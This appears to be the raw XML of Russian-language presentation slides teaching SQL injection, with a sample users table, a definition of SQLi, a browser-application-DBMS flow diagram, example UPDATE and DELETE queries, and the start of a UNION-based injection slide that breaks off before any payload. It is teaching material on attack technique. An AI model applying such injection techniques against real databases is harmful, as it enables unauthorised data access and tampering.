                        <a:rPr sz="1650" b="0" dirty="0" err="1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</a:rPr>
                        <a:t>alex_new</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0" dirty="0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</a:rPr>
                        <a:t>'</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0" dirty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650" b="0" dirty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WHERE</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0" dirty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id = </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="B5CEA8"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>17</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0" dirty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;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65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 / alex_new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650" b="0" dirty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DELETE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650" b="0" dirty="0" err="1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Удалить</a:t>
                      </a:r>
                      <a:endParaRPr sz="1650" b="0" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="EEF2F6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650" b="0" dirty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DELETE</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0" dirty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650" b="0" dirty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FROM</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0" dirty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users</a:t>
                      </a:r>
                    </a:p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650" b="0" dirty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WHERE</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0" dirty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id = </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="B5CEA8"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>23</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0" dirty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;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650" b="0" dirty="0" err="1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Строки</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0" dirty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23 </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1650" b="0" dirty="0" err="1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нет</a:t>
                      </a:r>
                      <a:endParaRPr sz="1650" b="0" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="EEF2F6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0920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CE902A58-7D9F-4105-BE2D-B9EAC6756AE8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Тестовые данные для примеров SQLi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F1E8F075-4F86-4243-97A2-D44F77B5737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Таблица users. Каждый следующий пример SQLi начинается с этого исходного набора.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DFE3DBF-D5A2-4B91-9BF5-B6E3B106142A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="685800" y="2714625"/>
          <a:ext cx="6191250" cy="289560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950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</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="9525">
                      <a:solidFill>
                        <a:srgbClr val="405064"/>
                      </a:solidFill>
                      <a:prstDash val="soli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>
                      <a:solidFill>
                        <a:srgbClr val="405064"/>
                      </a:solidFill>
                      <a:prstDash val="soli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950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username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>
                      <a:solidFill>
                        <a:srgbClr val="405064"/>
                      </a:solidFill>
                      <a:prstDash val="soli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2250" b="0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>17</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="9525">
                      <a:solidFill>
                        <a:srgbClr val="405064"/>
                      </a:solidFill>
                      <a:prstDash val="soli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2250" b="0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>alex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2250" b="0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>23</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="9525">
                      <a:solidFill>
                        <a:srgbClr val="405064"/>
                      </a:solidFill>
                      <a:prstDash val="soli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2250" b="0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>maria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2250" b="0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>42</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="9525">
                      <a:solidFill>
                        <a:srgbClr val="405064"/>
                      </a:solidFill>
                      <a:prstDash val="soli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2250" b="0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>admin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ypes-label">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A8324825-C3F5-450D-B03D-62D62D44066F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7658100" y="2657475"/>
            <a:ext cx="3848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Столбцы</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="schema">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{14020662-0AC5-49DE-AC3D-542BE09A86CC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7658100" y="3200400"/>
            <a:ext cx="38481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id </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800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INTEGER</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="18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PRIMARY KEY</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l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username </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800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TEXT</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="normal-label">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F5E04B75-CD81-4E08-8100-90D9A9193077}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7658100" y="4286250"/>
            <a:ext cx="3848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Обычный поиск</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="normal-query">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{85A01E46-AE0C-41F1-B37C-B3C58CA1FA5F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7658100" y="4819650"/>
            <a:ext cx="3848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username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users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id = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="172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17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8" name="normal-result">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F51F11CA-FD26-4E2E-B43F-AB7DB4022400}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7658100" y="5810250"/>
            <a:ext cx="3848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Результат: alex</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Рисунок 11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D589EDE3-3EC0-40EF-9292-6481347BC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5051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">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{16F6F94B-EC96-446C-B082-B5A577539508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lang="en-US" dirty="0"/>
              <a:t>SQL Injection </a:t>
            </a:r>
            <a:endParaRPr sz="3300" b="1" dirty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640FF0E9-DBA8-49A9-AAD0-43F92D844A8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SQL Injection (</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="21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SQLi</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="21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) </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="21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возникает</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="21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21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когда</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="21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пользовательское</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="21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значение</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="21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становится</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="21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частью</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="21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синтаксиса</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="21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запроса</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="21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21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который</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="21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выполняет</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="21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СУБД.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="process-node-client">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7688C5F5-9AE7-4B1C-8A27-0B7F758450DB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2857500" cy="253365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8D9B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client-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{03D70F05-0AAA-43F5-A9AF-08A10A697DFE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="857250" y="3505200"/>
            <a:ext cx="2514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Браузер</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="client-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2516F1A2-CD22-4C6F-AB90-20245C1E27C5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2476500" cy="1152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Передаёт параметры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поиска или входа</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="process-node-app">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ACE63088-146A-4DE0-8353-7D0BD3E6D846}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4667250" y="2686050"/>
            <a:ext cx="2857500" cy="253365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app-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{02F5D86B-7C62-4161-9ECC-5889062369D1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4838700" y="3505200"/>
            <a:ext cx="2514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Приложение</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="app-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{75EFF748-C003-4888-B4A8-D76FCE483A8D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4857750" y="3981450"/>
            <a:ext cx="2476500" cy="1152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Склеивает ввод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 текстом SQL-запроса</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="process-node-database">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C56A5624-1985-4D11-8DC4-193D143786EB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8648700" y="2686050"/>
            <a:ext cx="2857500" cy="253365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database-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BCF9A0F4-E6C7-4A82-9C59-398E62292B1D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8820150" y="3505200"/>
            <a:ext cx="2514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СУБД</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="database-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F8FA7C1B-DF29-4363-95ED-3919BE87AA49}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8839200" y="3981450"/>
            <a:ext cx="2476500" cy="1152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Разбирает SQL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Читает или меняет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данные</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="12" name="flow-input">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0CE557BD-FFEF-46B5-AC21-54A643230CB4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3543300" y="3371850"/>
            <a:ext cx="1123950" cy="0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3" name="flow-label-input">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{875D6B6C-0813-43F5-AEDD-4DFF15FC3439}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3600450" y="2943225"/>
            <a:ext cx="1009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Ввод</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="14" name="flow-query">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7D6563E4-60BA-4D87-BF19-0C554C1FE9F7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7524750" y="3371850"/>
            <a:ext cx="1123950" cy="0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5" name="flow-label-query">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FF0251AA-1665-4F7D-93D8-9A4497857A9F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7581900" y="2943225"/>
            <a:ext cx="1009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SQL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="16" name="flow-rows">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4D3D5545-1E62-44B2-A487-0F3E9FD64A99}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7524750" y="4514850"/>
            <a:ext cx="1123950" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="23813">
            <a:solidFill>
              <a:srgbClr val="8D9BA5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:headEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="flow-label-rows">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AA72BA35-CF0F-4805-8EB2-777432D9B98D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7581900" y="4610100"/>
            <a:ext cx="1009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Строки /</a:t>
            </a:r>
          </a:p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ошибка</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="18" name="flow-result">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4500DD65-EAB7-42CB-9704-D687A21C6138}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3543300" y="4514850"/>
            <a:ext cx="1123950" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="23813">
            <a:solidFill>
              <a:srgbClr val="8D9BA5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:headEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="flow-label-result">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B5267271-4520-4598-88D0-14365B1E90D7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3600450" y="4610100"/>
            <a:ext cx="1009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Ответ API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C678049D-1370-4256-9BBB-5495208F9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23" name="component-laptop-23">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F38D8F23-0D11-4579-A8A3-7C43522D03A3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1928812" y="2892028"/>
            <a:ext cx="371475" cy="278606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component-laptop-24">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{60554608-60AF-4C8B-B1EF-95E101FCFE9D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1866900" y="3170634"/>
            <a:ext cx="495300" cy="108347"/>
          </a:xfrm>
          <a:prstGeom prst="trapezoid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component-server-25">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{374AA910-E7E0-403C-A9D3-6B88A4199B65}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5879306" y="2876550"/>
            <a:ext cx="433388" cy="123825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component-server-26">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E7EB15CC-B68A-496A-8F10-A6861B9F984D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6235303" y="2915246"/>
            <a:ext cx="30956" cy="30956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component-server-27">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{48C47EBB-174E-4E35-9D84-D89EBA4928B1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5879306" y="3031331"/>
            <a:ext cx="433388" cy="123825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component-server-28">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{010AE264-8A77-4442-8085-993090309F69}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6235303" y="3070027"/>
            <a:ext cx="30956" cy="30956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component-server-29">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1FA25DBE-085B-44B1-A38A-5E2B3762CB1A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5879306" y="3186112"/>
            <a:ext cx="433388" cy="123825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component-server-30">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BA936154-4099-403E-B3FF-A05C438C10A0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6235303" y="3224809"/>
            <a:ext cx="30956" cy="30956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component-database-31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{678792F2-E2C7-4E44-8BE9-1E6FDFEAA3F5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9860756" y="2938462"/>
            <a:ext cx="433388" cy="294084"/>
          </a:xfrm>
          <a:prstGeom prst="rect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component-database-32">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FC9F4C20-65BC-46C1-83BE-D51E139DE2D1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9860756" y="2876550"/>
            <a:ext cx="433388" cy="123825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component-database-33">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{86EA66D9-FB95-46B3-8C8E-E1414285CF09}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9860756" y="3031331"/>
            <a:ext cx="433388" cy="123825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component-database-34">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D43EA863-9A38-41E0-9B5A-06E59F840927}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9860756" y="3186112"/>
            <a:ext cx="433388" cy="123825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32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0422AD01-99E5-4F71-8569-E63C0BE5B415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SQLi: дополнительная выборка UNION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E7DB18FF-758C-4B9D-A58A-A81ABA7350B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Обычный id = 17 возвращает alex. Теперь в параметр id добавлена вторая выборка.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="input-label">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{91A32FB4-D67C-442A-A34B-CD4BF9ECDDFA}"/>
              </a:ext>
            </a:extLst>
